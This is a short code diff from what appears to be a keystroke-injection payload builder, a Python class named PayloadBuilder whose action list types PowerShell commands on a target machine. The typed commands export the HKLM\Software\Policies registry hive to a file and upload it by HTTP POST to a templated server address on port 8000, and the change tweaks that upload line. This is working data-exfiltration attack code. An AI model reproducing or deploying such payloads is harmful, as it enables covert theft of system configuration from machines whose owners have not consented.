@@ -86,7 +86,7 @@ class PayloadBuilder:
                 {'action': 'combo', 'keys': ['ALT', 'y']},
                 {'action': 'delay', 'ms': 1000},
                 {'action': 'type', 'text': 'reg export HKLM\\Software\\Policies C:\\HKLM_Policies.reg /y;'},
-                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:8000" -Method POST -InFile C:\\HKLM_Policies.reg -Headers @{"X-Filename"="HKLM_Policies.reg"}'},
+                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:8000" -Method POST -InFile C:\\HKLM_Policies.reg -Headers @{"X-Filename"="HKLM_Policies.reg"} -UseBasicParsing'},
                 {'action': 'key', 'name': 'ENTER'},
                 {'action': 'delay', 'ms': 2000},
                 {'action': 'type', 'text': 'exit'},
